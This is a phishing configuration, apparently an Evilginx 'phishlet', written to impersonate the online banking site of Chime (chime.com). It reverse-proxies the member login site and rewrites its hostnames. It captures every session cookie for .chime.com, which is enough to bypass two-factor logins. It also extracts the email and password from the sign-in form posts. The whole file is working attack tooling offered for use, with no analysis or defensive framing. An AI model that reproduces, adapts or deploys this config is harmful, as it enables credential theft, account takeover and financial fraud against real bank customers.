author: '@longwu'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'member', orig_sub: 'member', domain: 'chime.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
auth_tokens:
  - domain: '.chime.com'
    keys: ['.*,regexp']

auth_urls:
  - '/member/spending#/'
  - '/member/.*'

credentials:
  username:
    key: 'user[email]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'user[password]'
    search: '(.*)'
    type: 'post'

login:
  domain: 'member.chime.com'
  path: '/users/sign_in'
  
